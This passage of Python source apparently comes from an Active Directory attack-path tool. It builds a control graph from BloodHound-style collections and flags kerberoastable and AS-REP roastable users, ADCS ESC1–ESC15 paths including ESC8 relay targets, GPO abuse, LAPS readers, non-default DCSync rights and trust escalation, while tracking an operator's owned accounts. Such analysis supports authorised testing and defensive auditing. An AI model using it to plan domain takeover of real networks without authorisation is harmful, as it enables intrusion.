    """SIDs that are privileged by ANY signal — member (recursive) of any
    high-value group (Domain/Enterprise Admins, builtin Administrators, Account/
    Backup/Server Operators, any admincount group), a high-value principal, or an
    adminCount user. Broader than _da_member_set and cached on the graph."""
    cached = getattr(g, "_priv_cache", None)
    if cached is not None:
        return cached
    out = set()
    for sid, n in g.nodes.items():
        if n.kind == "Group" and g.is_highvalue(sid):
            out |= set(_expand_members(g, sid))
        if g.is_highvalue(sid):
            out.add(sid)
        if n.p("admincount"):
            out.add(sid)
    g._priv_cache = out
    return out

def _priv_roast_tag(g, sid, da_set=None):
    """Loud tag if a roastable/controllable account is itself privileged."""
    if sid in _priv_set(g) or g.is_highvalue(sid):
        return red("  [★ PRIVILEGED]")
    n = g.nodes.get(sid)
    if n and n.p("admincount"):
        return yellow("  [adminCount]")
    return ""

def _laps_readers(g):
    """[(reader_sid, computer_sid)] for non-admin principals that can read LAPS."""
    out = []
    for sid, n in g.nodes.items():
        if n.kind != "Computer":
            continue
        for (src, lbl) in g.rctrl.get(sid, []):
            if lbl == "ReadLAPSPassword" and src in g.nodes and not _is_admin(g, src):
                out.append((src, sid))
    return out

def _sessions_index(g):
    """computer_sid -> [user sids with a session there] (cached on the graph)."""
    cached = getattr(g, "_sess_idx", None)
    if cached is not None:
        return cached
    idx = defaultdict(list)
    for csid, cn in g.nodes.items():
        if cn.kind == "Computer":
            for u in cn.sessions:
                idx[csid].append(u)
    g._sess_idx = idx
    return idx

def _da_members(g):
    out = set()
    for sid, n in g.nodes.items():
        if n.kind == "Group" and sid.rsplit("-", 1)[-1] in ("512", "519"):
            out |= set(_expand_members(g, sid))
    return out

def _admin_sessions(g):
    """[(computer_sid, [DA/EA user sids logged on there])] sorted by computer name."""
    da = _da_members(g)
    out = []
    for csid, users in _sessions_index(g).items():
        hit = [u for u in users if u in da]
        if hit and g.nodes.get(csid):
            out.append((csid, hit))
    return sorted(out, key=lambda x: g.nodes[x[0]].name)

def _trust_lines(g):
    """[(text, abusable)] one per collected trust."""
    out = []
    for tr in g.trusts:
        src = g.nodes[tr["src"]].name if tr["src"] in g.nodes else tr["src"]
        we, they = _trust_abuse(tr)
        arrow = {"Inbound": "<-", "Outbound": "->", "Bidirectional": "<->"}.get(tr["dir"], "--")
        sf = {True: "SID filtering on", False: "SID filtering OFF", None: "SID filtering ?"}[tr["sidfilter"]]
        txt = f"{src} {arrow} {tr['name']}  [{tr['type']}, {tr['dir']}, {sf}]"
        if we:
            txt += f"  - own {src} => golden ticket + ExtraSids => {tr['name']}"
        if they:
            txt += f"  - own {tr['name']} => ExtraSids => {src}"
        if not (we or they) and tr["dir"] in ("Inbound", "Bidirectional"):
            txt += f"  - your users can authenticate to {tr['name']} (enumerate/kerberoast it)"
        out.append((txt, we or they))
    return out

def _domains(g):
    """Every domain the collection knows about, primary first, as dicts:
    sid, name, collected (its objects are in this data), role ('forest root',
    'child of X', 'same forest', 'external', 'other forest' or ''), users, computers,
    level (functional level), trust (the trust line from the primary's view, or None).

    The forest root is ForestRootIdentifier when collected; otherwise inferred from the
    names (ROOT.LOCAL is the parent of CHILD.ROOT.LOCAL) across intra-forest trusts."""
    doms = {}
    for sid in g.domain_sids:
        doms[sid] = True
    for tr in g.trusts:
        doms.setdefault(tr["src"], True)
        doms.setdefault(tr["dst"], tr["dst"] in g.domain_sids)
    names = {s: (g.nodes[s].name if s in g.nodes else s).upper() for s in doms}
    intra = {s for tr in g.trusts if tr["type"] in _INTRA_FOREST for s in (tr["src"], tr["dst"])}
    if g.domain_sids:
        intra.add(g.domain_sids[0])
    root = g.forest_root if g.forest_root in doms else None
    if not root and len(intra) > 1:
        # the intra-forest domain whose name is a dotted suffix of the others
        cands = [s for s in intra
                 if all(s == o or names[o].endswith("." + names[s]) for o in intra)]
        if len(cands) == 1:
            root = cands[0]
    if not root and len(intra) > 1:
        # a ParentChild trust between unrelated names (a new tree) — the side that is
        # not the collected primary is the parent we trust into
        pc = [tr for tr in g.trusts if tr["type"] == "ParentChild"
              and g.domain_sids and tr["src"] == g.domain_sids[0]]
        if len(pc) == 1:
            root = pc[0]["dst"]
    users, comps = defaultdict(int), defaultdict(int)
    for sid, n in g.nodes.items():
        if n.kind in ("User", "Computer"):
            d = sid.rsplit("-", 1)[0]
            (users if n.kind == "User" else comps)[d] += 1
    primary = g.domain_sids[0] if g.domain_sids else None
    trust_of = {}
    for tr in g.trusts:
        if tr["src"] == primary:
            trust_of[tr["dst"]] = tr
    out = []
    for sid, collected in doms.items():
        tr = trust_of.get(sid)
        if sid == root:
            role = "forest root"
        elif sid in intra and root:
            role = f"child of {names[root]}"
        elif sid in intra and sid != primary:
            role = "same forest"
        elif tr and tr["type"] == "External":
            role = "external"
        elif tr and tr["type"] == "Forest":
            role = "other forest"
        else:
            role = ""
        n = g.nodes.get(sid)
        out.append({"sid": sid, "name": names[sid], "collected": collected, "role": role,
                    "users": users.get(sid, 0), "computers": comps.get(sid, 0),
                    "level": n.p("functionallevel") if n else None, "trust": tr,
                    "primary": sid == primary})
    out.sort(key=lambda d: (not d["primary"], d["role"] != "forest root", d["name"]))
    return out

def _domain_lines(g):
    """[(text, highlight)] one per domain, for the summaries."""
    out = []
    for d in _domains(g):
        bits = [d["name"]]
        tags = []
        if d["primary"]:
            tags.append("this collection")
        if d["role"]:
            tags.append(d["role"])
        if d["collected"]:
            tags.append(f"{d['users']} users, {d['computers']} computers")
            if d["level"]:
                tags.append(f"level {d['level']}")
        else:
            tags.append("not collected - trust only")
        tr = d["trust"]
        if tr:
            tags.append(f"trust {tr['dir'].lower()}")
        bits.append("[" + ", ".join(tags) + "]")
        bits.append(d["sid"])
        out.append(("  ".join(bits), d["role"] == "forest root"))
    return out

def _computer_value(g, csid, priv=None):
    """Why controlling a computer matters beyond itself: it's a DC, or a
    privileged user exposes credentials on it (a session, or they're a local
    admin whose secrets may be cached). Returns (is_juicy, [short tags]).
    This is what turns 'I can read LAPS on 1000 hosts' into 'these 4 give me DA.'"""
    priv = priv if priv is not None else _priv_set(g)
    tags = []
    if _is_dc(g, csid):
        tags.append("DC → domain")
    hv_sess = sorted({g.nodes[u].name.split("@")[0] for u in _sessions_index(g).get(csid, [])
                      if g.nodes.get(u) and (u in priv or g.is_highvalue(u))})
    if hv_sess:
        tags.append("session: " + ", ".join(hv_sess))
    hv_adm = sorted({g.nodes[a].name.split("@")[0]
                     for (a, l) in g.rctrl.get(csid, [])
                     if l == "AdminTo" and g.nodes.get(a) and (a in priv or g.is_highvalue(a))})
    if hv_adm:
        tags.append("admin: " + ", ".join(hv_adm))
    hv = g.is_highvalue(csid)
    if hv:
        tags.append(str(hv))
    return (bool(tags), tags)

def _user_owned_computers(g):
    """[(owner_sid, computer_sid)] where a non-admin USER owns a computer object.

    A user who creates a machine via MachineAccountQuota becomes its owner, so
    this is the practical 'machines added through MAQ' view."""
    out = []
    for sid, n in g.nodes.items():
        if n.kind != "Computer":
            continue
        for (src, lbl) in g.rctrl.get(sid, []):
            s = g.nodes.get(src)
            if (lbl in ("Owns", "Owner", "WriteOwner") and s and s.kind == "User"
                    and not _is_admin(g, src)):
                out.append((src, sid))
    return out

def _user_detail_lines(g, n):
    """Non-blank, interesting fields for a user, as 'key = value' strings."""
    out = []
    for key, short in [("description", "description"), ("title", "title"),
                       ("email", "email"), ("displayname", "displayname")]:
        v = n.p(key)
        if v not in (None, "", []):
            out.append(f"{short} = {v}")
    return out

def _obj_domain(g, props):
    """The collected domain an ADCS object belongs to: its domainsid, else its domain
    name, else the first domain in the collection."""
    ds = str(props.get("domainsid") or "")
    if ds in g.domain_sids:
        return ds
    dn = str(props.get("domain") or "").upper()
    for d in g.domain_sids:
        n = g.nodes.get(d)
        if dn and n and str(n.name).upper() == dn:
            return d
    return g.domain_sids[0] if g.domain_sids else None

def _in_domain(sid, domain):
    return bool(domain) and str(sid).startswith(domain + "-")

def analyze_adcs(g):

    def expand(psid):
        out = {psid}
        n = g.nodes.get(psid)
        if n and n.kind == "Group":
            for m in _expand_members(g, psid):
                out.add(m)
        return out

    # A SAN / enrollment-agent abuse lets the enroller request a certificate AS any user —
    # so besides "→ domain" it gets a direct edge to each admin account it can become.
    admins = {}

    def impersonate(abuser, domain, code):
        if code not in IMPERSONATE_ESCS:
            return
        if domain not in admins:
            admins[domain] = [sid for (_n, sid, _u, _l) in _impersonation_targets(g)
                              if str(sid).startswith(str(domain) + "-")]
        for victim in admins[domain]:
            if victim != abuser:
                g.add_edge(abuser, victim, code)

    for ca in g.cas:
        ca["domain"] = _obj_domain(g, ca["props"])
    for t in g.templates:
        p = t["props"]
        domain = t["domain"] = _obj_domain(g, p)
        ekus = _ekus(t)
        no_eku = len(ekus) == 0
        auth = bool(set(ekus) & AUTH_EKUS) or no_eku
        approval = _truthy(p.get("requiresmanagerapproval"))
        authsig = int(p.get("authorizedsignatures") or 0)
        ess = _truthy(p.get("enrolleesuppliessubject"))
        nosec = _truthy(p.get("nosecurityextension"))
        open_issue = (not approval) and authsig == 0
        escs = []
        if ess and auth and open_issue:
            escs.append("ESC1")
        if (ANY_PURPOSE in ekus or no_eku) and open_issue and not ess:
            escs.append("ESC2")
        if REQUEST_AGENT_EKU in ekus and open_issue:
            escs.append("ESC3")
        if nosec and auth and open_issue:
            escs.append("ESC9")
        if str(p.get("schemaversion")) == "1" and ess and open_issue and "ESC1" not in escs:
            escs.append("ESC15")
        pols = p.get("issuancepolicies") or p.get("certificatepolicy") or []
        pols = [pols] if isinstance(pols, str) else pols
        linked = sorted({g.oid_group[str(o)] for o in pols if str(o) in g.oid_group})
        t["esc13_groups"] = linked if (linked and auth and open_issue) else []
        if t["esc13_groups"]:
            escs.append("ESC13")
        write_abusers = set()
        for psid, right in t["aces"]:
            if right in TEMPLATE_WRITE:
                for e in expand(psid):
                    if not g.is_highvalue(e) and not _is_admin(g, e):
                        write_abusers.add(e)
        if write_abusers:
            escs.append("ESC4")
        t["escs"] = escs
        enrollers = set()
        for psid, right in t["aces"]:
            if right in ("Enroll", "AllExtendedRights", "GenericAll"):
                enrollers |= expand(psid)
        t["enrollers"] = enrollers
        t["write_abusers"] = write_abusers
        if domain and (set(escs) & set(ENROLL_ESCS)):
            code = next(c for c in escs if c in ENROLL_ESCS)
            for e in enrollers:
                en = g.nodes.get(e)
                if en and en.kind in ("User", "Computer"):
                    g.add_edge(e, domain, code)
                    g.esc_branches.append((code, e, t["name"]))
                    impersonate(e, domain, code)
        for grp in t["esc13_groups"]:
            for e in enrollers:
                en = g.nodes.get(e)
                if en and en.kind in ("User", "Computer"):
                    g.add_edge(e, grp, "ESC13")
        if domain and "ESC4" in escs:
            for e in write_abusers:
                en = g.nodes.get(e)
                if en and en.kind in ("User", "Computer"):
                    g.add_edge(e, domain, "ESC4")
                    g.esc_branches.append(("ESC4", e, t["name"]))
                    impersonate(e, domain, "ESC4")

    for ca in g.cas:
        abusers = set()
        for psid, right in ca["aces"]:
            if right in ("ManageCA", "ManageCertificates"):
                for e in expand(psid):
                    en = g.nodes.get(e)
                    if en and en.kind in ("User", "Group") and not _is_admin(g, e):
                        abusers.add(e)
        ca["esc7"] = abusers
        domain = ca["domain"]
        ca["esc8"] = _esc8(g, ca, domain)
        if ca["esc8"].get("edge"):
            g.add_edge(ca["esc8"]["source"], domain, "ESC8")
            g.esc_branches.append(("ESC8", ca["esc8"]["source"], ca["name"]))

def _esc8(g, ca, domain):
    """ESC8 verdict for one CA: a relayable web-enrollment endpoint, a template a DC can
    enroll in, and a DC other than the CA host to coerce (a host can't be relayed to itself).
    Any domain user can coerce a DC, so the edge starts at Domain Users."""
    out = {"urls": ca.get("http_vuln", []), "template": None, "coerce": [], "edge": False,
           "source": None, "why": ""}
    if not out["urls"] or not domain:
        out["why"] = "no NTLM-relayable web-enrollment endpoint collected"
        return out
    dc_enroll = None
    for t in g.templates:
        if ca not in _ca_publishers(g, t):
            continue
        ekus = _ekus(t)
        if ekus and not (set(ekus) & AUTH_EKUS):
            continue
        rids = {str(s).rsplit("-", 1)[-1] for s in t.get("enrollers", ())}
        if ({"516"} & rids or any(str(s).endswith("S-1-5-9") for s in t.get("enrollers", ()))
                or _template_cn(t).upper() == "DOMAINCONTROLLER"):
            dc_enroll = t
            break
    out["template"] = _template_cn(dc_enroll) if dc_enroll else None
    host = str(_ca_host(ca)).upper()
    dcs = [n for s, n in g.nodes.items()
           if n.kind == "Computer" and _is_dc(g, s) and _in_domain(s, domain)]
    out["coerce"] = sorted({str(n.p("dnshostname") or n.name.split("@")[0]) for n in dcs}
                           - {host, host.lower()}, key=str.lower)
    out["source"] = next((s for s, n in g.nodes.items() if n.kind == "Group"
                          and s.startswith(domain + "-") and s.rsplit("-", 1)[-1] == "513"), None)
    if not dc_enroll:
        out["why"] = "no DC-enrollable client-auth template published on this CA"
    elif not out["coerce"]:
        out["why"] = "the CA runs on the only DC - relay back to itself is blocked; coerce a member server instead"
    elif not out["source"]:
        out["why"] = "Domain Users group not in the collection"
    else:
        out["edge"] = True
    return out

def build_gpo_abuse(g):
    """Control of a GPO -> code execution on every computer it is linked to.
    Adds GPO -> computer edges (label GPOAbuse) via the container tree + GPLinks."""
    memo = {}

    def subtree_computers(sid, seen):
        if sid in memo:
            return memo[sid]
        if sid in seen:
            return set()
        seen = seen | {sid}
        comps = set()
        for c in g.container_children.get(sid, []):
            cn = g.nodes.get(c)
            if cn and cn.kind == "Computer":
                comps.add(c)
            else:
                comps |= subtree_computers(c, seen)
        memo[sid] = comps
        return comps

    for csid, guids in g.container_links.items():
        comps = subtree_computers(csid, set())
        for guid in guids:
            gpo = g.gpo_by_guid.get(guid)
            if not gpo:
                continue
            g.gpo_affects.setdefault(gpo, set()).update(comps)
            for comp in comps:
                g.add_edge(gpo, comp, "GPOAbuse")


def _progress(msg, done=False):
    """Lightweight single-line progress on stderr (only when it's a TTY)."""
    if not sys.stderr.isatty():
        return
    sys.stderr.write("\r\033[K  " + msg + ("\n" if done else ""))
    sys.stderr.flush()

def _json_member_names(path):
    """Names of the JSON members we'll actually load (for a progress total)."""
    if os.path.isdir(path):
        return [fn for fn in sorted(os.listdir(path)) if _is_json_member(fn)]
    if zipfile.is_zipfile(path):
        with zipfile.ZipFile(path) as z:
            return [n for n in z.namelist() if _is_json_member(n)]
    return [os.path.basename(path)]

def state_path(g):
    """Per-domain file holding the operator's owned / start / targets between runs."""
    base = os.environ.get("XDG_STATE_HOME") or os.path.join(os.path.expanduser("~"), ".local", "state")
    # keyed on the primary (first-loaded) domain only, so adding a second -d that brings
    # in another domain doesn't orphan the saved state
    key = (g.domain_sids[0] if g.domain_sids else None) or g.domain_name or "unknown"
    key = re.sub(r"[^A-Za-z0-9._-]", "_", key)[:120]
    return os.path.join(base, "bernese", key + ".json")

def load_state(g):
    try:
        with open(state_path(g)) as f:
            st = json.load(f)
    except (OSError, ValueError):
        return None
    if not isinstance(st, dict):
        return None
    keep = lambda xs: [s for s in (xs or []) if s in g.nodes]
    start = st.get("start") if st.get("start") in g.nodes else None
    paths = [tuple(pr) for pr in (st.get("paths") or [])
             if isinstance(pr, list) and len(pr) == 2 and all(x in g.nodes for x in pr)]
    return {"owned": keep(st.get("owned")), "targets": keep(st.get("targets")), "start": start,
            "paths": paths}

def save_state(g, owned, targets, start, paths=()):
    p = state_path(g)
    try:
        os.makedirs(os.path.dirname(p), exist_ok=True)
        tmp = p + ".tmp"
        with open(tmp, "w") as f:
            json.dump({"domain": g.domain_name, "owned": sorted(owned),
                       "targets": sorted(targets), "start": start,
                       "paths": [list(pr) for pr in paths]}, f, indent=1)
        os.replace(tmp, p)
        return True
    except OSError:
        return False

def clear_state(g):
    try:
        os.remove(state_path(g))
        return True
    except OSError:
        return False

LAPS_READ_EDGES = {"ReadLAPSPassword", "SyncLAPSPassword", "GenericAll", "AllExtendedRights"}

def data_quality(g):
    """Collection-completeness signals: which collector produced the data, ACE rights
    that weren't turned into edges, and edge types the data implies but never contains."""
    labels = defaultdict(int)
    for lst in g.ctrl.values():
        for (_d, lbl) in lst:
            labels[lbl] += 1
    comps = [n for n in g.nodes.values() if n.kind == "Computer"]
    laps = [n.sid for n in comps if n.p("haslaps")]
    laps_norecv = [s for s in laps
                   if not any(l in LAPS_READ_EDGES for (_s, l) in g.rctrl.get(s, []))]
    users = sum(1 for n in g.nodes.values() if n.kind == "User")
    notes = []
    if laps and not labels.get("ReadLAPSPassword") and not labels.get("SyncLAPSPassword"):
        notes.append(f"{len(laps)} computer(s) have LAPS but the data has no ReadLAPSPassword "
                     "edges at all — the collector likely didn't emit them")
    if users >= 5 and not labels.get("WriteAccountRestrictions"):
        why = ("RustHound-CE 2.5.x doesn't emit this right"
               if any("rusthound" in c.lower() for c in g.collectors)
               else "the collector may not emit this right")
        notes.append(f"no WriteAccountRestrictions edges — {why} (it can still exist in AD)")
    if g.unmodeled:
        top = ", ".join(f"{k} ×{v}" for k, v in sorted(g.unmodeled.items(),
                                                     key=lambda kv: -kv[1])[:6])
        notes.append(f"ACE rights present but not modelled as edges: {top}")
    if not g.collectors:
        notes.append("no meta.collectorversion in the data (collector unknown)")
    if len(g.sources) > 1:
        notes.append(f"merged {len(g.sources)} collections: " + ", ".join(g.sources))
    return {"collectors": sorted(g.collectors), "laps": laps, "laps_noreader": laps_norecv,
            "notes": notes, "edge_counts": dict(labels)}

def load(path):
    # Accept one source or several (merge). Collecting one box at a time is the norm when
    # SharpHound can't run everywhere, so -d can take multiple zips/dirs and they fold into
    # one graph: nodes merge by SID, ACEs / members are de-duplicated before edge-building.
    paths = [path] if isinstance(path, str) else list(path)
    g = Graph()
    g.sources = [os.path.basename(p) for p in paths]
    total = sum(len(_json_member_names(p)) for p in paths) or 1
    seen_files = 0
    for p in paths:
      for fname, blob in _iter_json(p):
        seen_files += 1
        _progress(f"loading [{seen_files}/{total}] {os.path.basename(fname)} …")
        if not isinstance(blob, dict):
            continue
        meta = blob.get("meta", {}) or {}
        data = blob.get("data", []) or []
        kind = _kind_from(meta.get("type"), fname)
        cv = meta.get("collectorversion") or meta.get("collector")
        if cv:
            g.collectors.add(str(cv))
        for obj in data:
            if not isinstance(obj, dict):
                continue
            if kind == "CertTemplate":
                g.templates.append(_mk_template(obj))
                continue
            if kind == "EnterpriseCA":
                g.cas.append(_mk_ca(obj))
                continue
            if kind == "IssuancePolicy":
                oid = (_get(obj, "Properties", default={}) or {}).get("certtemplateoid")
                link = _get(obj, "GroupLink", default=None)
                gsid = _get(link, "ObjectIdentifier", "objectid") if isinstance(link, dict) else None
                if oid and gsid:
                    g.oid_group[str(oid)] = str(gsid)
                continue
            if kind in ("RootCA", "NTAuthStore", "AIACA"):
                continue
            sid = _get(obj, "ObjectIdentifier", "objectid", "ObjectId")
            if not sid:
                continue
            sid = str(sid)
            n = g.node(sid)
            if n.kind == "Base":
                n.kind = kind
            props = _get(obj, "Properties", default={}) or {}
            newprops = {str(k).lower(): v for k, v in props.items()}
            if n.props:                              # merge collections: keep earlier values
                for k, v in newprops.items():        # unless this source has a non-empty one
                    if v not in (None, "", [], {}) or k not in n.props:
                        n.props[k] = v
            else:
                n.props = newprops
            n.name = n.p("name") or n.p("distinguishedname") or sid
            for key in ("name", "samaccountname", "distinguishedname"):
                v = n.p(key)
                if v:
                    g.by_name[str(v).upper()] = sid
            g.by_name[sid.upper()] = sid
            for ace in _get(obj, "Aces", default=[]) or []:
                psid = _get(ace, "PrincipalSID", "PrincipalSid")
                right = _get(ace, "RightName", "Right")
                inh = _get(ace, "IsInherited", default=False)
                if psid and right:
                    n.aces.append((str(psid), str(right), bool(inh)))
            for m in _get(obj, "Members", default=[]) or []:
                mid = _get(m, "ObjectIdentifier", "objectid") if isinstance(m, dict) else m
                if mid:
                    n.members.append(str(mid))
            pg = _get(obj, "PrimaryGroupSID", "PrimaryGroupSid")
            if pg:
                n.primary_group = str(pg)
            for key, lbl in _LEGACY_LOCAL_FIELDS:
                for rid in _result_sids(_get(obj, key, default=None)):
                    _add_local_right(g, n, rid, lbl)
            for lg in (_get(obj, "LocalGroups", default=[]) or []):
                if not isinstance(lg, dict):
                    continue
                gid = str(_get(lg, "ObjectIdentifier", "objectid", default="") or "")
                lbl = LOCAL_GROUP_EDGE.get(gid.rsplit("-", 1)[-1])
                if not lbl:
                    continue
                machine = gid.rsplit("-", 1)[0] + "-"
                for r in (_get(lg, "Results", default=[]) or []):
                    rid = _get(r, "ObjectIdentifier", "objectid") if isinstance(r, dict) else r
                    otype = str(_get(r, "ObjectType", default="") or "") if isinstance(r, dict) else ""
                    if not rid or str(rid).startswith(machine) or otype.startswith("Local"):
                        continue
                    _add_local_right(g, n, str(rid), lbl)
            for st in (_get(obj, "SPNTargets", default=[]) or []):
                if isinstance(st, dict) and str(_get(st, "Service", default="")) == "SQLAdmin":
                    csid = _get(st, "ComputerSID", "ComputerSid")
                    if csid:
                        n.spntargets.append(str(csid))
            for hs in (_get(obj, "HasSIDHistory", default=[]) or []):
                hsid = _get(hs, "ObjectIdentifier", "objectid") if isinstance(hs, dict) else hs
                if hsid:
                    g.sidhistory.append((sid, str(hsid)))
            if kind == "Domain":
                fr = _get(obj, "ForestRootIdentifier", default=None)
                if fr:
                    g.forest_root = str(fr)
                for tr in (_get(obj, "Trusts", default=[]) or []):
                    if isinstance(tr, dict) and _get(tr, "TargetDomainSid", "TargetDomainSID"):
                        g.trusts.append(_mk_trust(sid, tr))
            ata = _get(obj, "AllowedToAct", default=None)
            if isinstance(ata, dict):
                ata = ata.get("Results", []) or []
            for r in (ata or []):
                rid = _get(r, "ObjectIdentifier", "objectid") if isinstance(r, dict) else r
                if rid:
                    n.allowed_to_act.append(str(rid))
            for r in (_get(obj, "AllowedToDelegate", default=[]) or []):
                rid = _get(r, "ObjectIdentifier", "objectid") if isinstance(r, dict) else r
                if rid:
                    n.allowed_to_delegate.append(str(rid))
            for key in ("Sessions", "PrivilegedSessions", "RegistrySessions"):
                sess = _get(obj, key, default=None)
                if isinstance(sess, dict):
                    sess = sess.get("Results", []) or []
                for r in (sess or []):
                    u = _get(r, "UserSID", "UserSid") if isinstance(r, dict) else None
                    if u and str(u) not in n.sessions:
                        n.sessions.append(str(u))
            # GPO structure: container tree + GPLinks
            if n.kind in ("Domain", "OU", "Container"):
                for c in (_get(obj, "ChildObjects", default=[]) or []):
                    cid = _get(c, "ObjectIdentifier", "objectid") if isinstance(c, dict) else c
                    if cid:
                        g.container_children.setdefault(sid, []).append(str(cid))
                for lk in (_get(obj, "Links", default=[]) or []):
                    guid = _get(lk, "GUID", "guid") if isinstance(lk, dict) else lk
                    if guid:
                        g.container_links.setdefault(sid, []).append(str(guid).upper())
            if n.kind == "GPO":
                g.gpo_by_guid[sid.upper()] = sid
            if n.kind == "Domain":
                g.domain_sids.append(sid)
                dn = n.p("name") or n.p("domain")
                if dn and not g.domain_name:
                    g.domain_name = str(dn)
                maq = n.p("machineaccountquota")
                if maq is not None:
                    try:
                        maq = int(maq)
                    except (ValueError, TypeError):
                        pass
                    if g.maq is None:
                        g.maq = maq
    if not g.domain_name:
        for nm in g.by_name:
            if "@" in nm:
                g.domain_name = nm.split("@", 1)[1]
                break
    # merging several collections can repeat the same object's ACEs / members / etc.;
    # de-duplicate (order-preserving) so edges aren't double-counted.
    if len(g.sources) > 1:
        for n in g.nodes.values():
            if n.aces:
                n.aces = list(dict.fromkeys(n.aces))
            for attr in ("members", "allowed_to_act", "allowed_to_delegate",
                         "spntargets", "sessions"):
                v = getattr(n, attr)
                if v:
                    setattr(n, attr, list(dict.fromkeys(v)))
        g.sidhistory = list(dict.fromkeys(g.sidhistory))
        g.local_rights = list(dict.fromkeys(g.local_rights))
        g.domain_sids = list(dict.fromkeys(g.domain_sids))
        seen_t = set()
        g.trusts = [t for t in g.trusts
                    if not ((t["src"], t["dst"]) in seen_t or seen_t.add((t["src"], t["dst"])))]
        def _adcs_key(o):                   # GUID is often blank: fall back to name+domain
            p = o["props"]
            return o.get("guid") or p.get("objectguid") or (
                str(o["name"]).upper(), str(p.get("domainsid") or p.get("domain") or "").upper())
        seen_tp = set()
        g.templates = [t for t in g.templates
                       if not (_adcs_key(t) in seen_tp or seen_tp.add(_adcs_key(t)))]
        seen_ca = set()
        g.cas = [c for c in g.cas
                 if not (_adcs_key(c) in seen_ca or seen_ca.add(_adcs_key(c)))]
        for d in (g.container_children, g.container_links):
            for k, v in d.items():
                d[k] = list(dict.fromkeys(v))
    # fold primary-group membership into the group's member list
    for sid, n in list(g.nodes.items()):
        if n.primary_group:
            pg = g.nodes.get(n.primary_group)
            if pg and sid not in pg.members:
                pg.members.append(sid)
    _progress("building control graph …")
    g.build_edges()
    _progress("analysing ADCS / ESC …")
    analyze_adcs(g)
    _progress("resolving GPO links …")
    build_gpo_abuse(g)
    g.dq = data_quality(g)
    _progress(f"loaded {len(g.nodes)} nodes, "
              f"{sum(len(v) for v in g.ctrl.values())} edges.", done=True)
    return g

# --------------------------------------------------------------------------- #
# Commands
# --------------------------------------------------------------------------- #
def flags_for(g, n):
    f = []
    # SPN flag only for USER accounts — a computer's host SPNs aren't kerberoastable.
    if n.kind == "User" and (n.p("hasspn") or n.p("serviceprincipalnames")) and n.sid.rsplit("-", 1)[-1] != "502":
        f.append(red("SPN"))
    if n.p("dontreqpreauth"):
        f.append(red("NoPreAuth"))
    if n.p("admincount"):
        f.append(yellow("adminCount"))
    if n.p("unconstraineddelegation"):
        f.append(dim("Unconstrained[default]") if _is_default_unconstrained(g, n.sid)
                 else red("Unconstrained"))
    if n.p("trustedtoauth"):
        f.append(yellow("ConstrainedDeleg"))
    if n.p("passwordnotreqd"):
        f.append(red("PwdNotReqd"))
    if n.p("sidhistory"):
        f.append(red("SIDHistory"))
    if n.p("sensitive"):
        f.append(dim("sensitive"))
    if n.p("enabled") is False:
        f.append(dim("disabled"))
    return "  ".join(f)

def cmd_summary(g, args):
    kinds = defaultdict(int)
    for n in g.nodes.values():
        kinds[n.kind] += 1
    edges = sum(len(v) for v in g.ctrl.values())
    header(f"Domain: {g.domain_name or '?'}")
    print(f"  {kinds.get('User',0)} users   {kinds.get('Group',0)} groups   "
          f"{kinds.get('Computer',0)} computers   {dim(str(edges) + ' control edges')}")
    dq = g.dq or {}
    if dq.get("collectors"):
        print(dim("  collector: " + ", ".join(dq["collectors"])))
    for note in dq.get("notes", []):
        print(yellow("  [data] ") + note)

    def bullet(label, items, empty_ok=True, count=None):
        """Print a finding section; items is a list of pre-formatted strings.
        `count` overrides the badge number for sections whose items are a single
        pre-joined line (e.g. the DA roster) so the badge reflects the real total."""
        if not items:
            if not empty_ok:
                print(f"\n  {bold(label)}\n     {dim('(none)')}")
            return
        n = len(items) if count is None else count
        print(f"\n  {bold(label)}  {dim('(' + str(n) + ')')}")
        for it in items:
            print("     " + it)

    da_set = _da_member_set(g)
    # Domain admins (who actually has the keys)
    da = []
    for sid, n in g.nodes.items():
        if n.kind == "Group" and sid.rsplit("-", 1)[-1] in ("512", "519"):
            for m in _expand_members(g, sid):
                mn = g.nodes.get(m)
                if mn and mn.kind in ("User", "Computer"):
                    da.append(mn.name.split("@")[0] + _A_plain(_roast_mark(g, m)))
    da_uniq = sorted(set(da))
    bullet("Domain / Enterprise Admins",
           [", ".join(da_uniq)] if da_uniq else [], count=len(da_uniq))

    # Kerberoastable (privileged first, RC4 before AES)
    kerb = sorted([n for n in g.nodes.values()
                   if n.kind == "User" and (n.p("hasspn") or n.p("serviceprincipalnames"))
                   and n.sid.rsplit("-", 1)[-1] != "502"],
                  key=lambda x: (x.sid not in da_set, not x.p("admincount"),
                                 "RC4" not in (_enc_types(x) or {"RC4"}), x.name))
    bullet("Kerberoastable users", [
        f"{green(n.name.split('@')[0])}  {_roast_enc_tag(n)[0]}"
        + _priv_roast_tag(g, n.sid, da_set)
        for n in kerb])

    # AS-REP
    asrep = [n for n in g.nodes.values() if n.kind == "User" and n.p("dontreqpreauth")]
    bullet("AS-REP roastable users", [green(n.name.split("@")[0]) for n in asrep])

    # ADCS actionable ESC
    esc_items = []
    for code, abuser, tname in sorted(set(g.esc_branches)):
        if g.nodes.get(abuser) and not _is_admin(g, abuser):
            esc_items.append(f"{red(code)} on {bold(tname.split('@')[0])}  "
                             f"{dim('→ own')} {green(g.nodes[abuser].name.split('@')[0])} {dim('= domain compromise')}")
    for ca in g.cas:
        for e in sorted(ca.get("esc7", [])):
            esc_items.append(f"{red('ESC7')} on CA {bold(ca['name'].split('@')[0])} "
                             f"{dim('held by')} {green(g.nodes[e].name.split('@')[0] if e in g.nodes else e)}")
    bullet("ADCS certificate escalation (ESC)", esc_items)

    # Non-default DCSync
    dcs = []
    for dsid in g.domain_sids:
        for (src, lbl) in g.rctrl.get(dsid, []):
            if (lbl == "DCSync" or lbl in REPL_RIGHTS) and not _is_default_dcsync(g, src):
                dcs.append(g.nodes[src].name.split("@")[0] if src in g.nodes
                           else (_sid_hint(src) or src))
    bullet("Non-default DCSync rights", sorted(set(dcs)))

    # LAPS readers (non-admin) -> local admin on those hosts
    laps = defaultdict(set)
    for reader, comp in _laps_readers(g):
        laps[reader].add(comp)
    bullet("LAPS password readers (non-admin → local admin)", [
        f"{green(g.nodes[r].name.split('@')[0])} "
        f"{dim('→ reads LAPS on ' + str(len(cs)) + ' computer(s)')}"
        for r, cs in sorted(laps.items(), key=lambda kv: -len(kv[1]))])

    # Non-admin GPO control -> code exec on linked hosts
    gpo_items = []
    for gpo in g.gpo_by_guid.values():
        holders = sorted({g.nodes[src].name.split("@")[0]
                          for (src, lbl) in g.rctrl.get(gpo, [])
                          if lbl in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner",
                                     "Owns", "WriteGPLink") and src in g.nodes
                          and not _is_admin(g, src)})
        if holders and gpo in g.nodes:
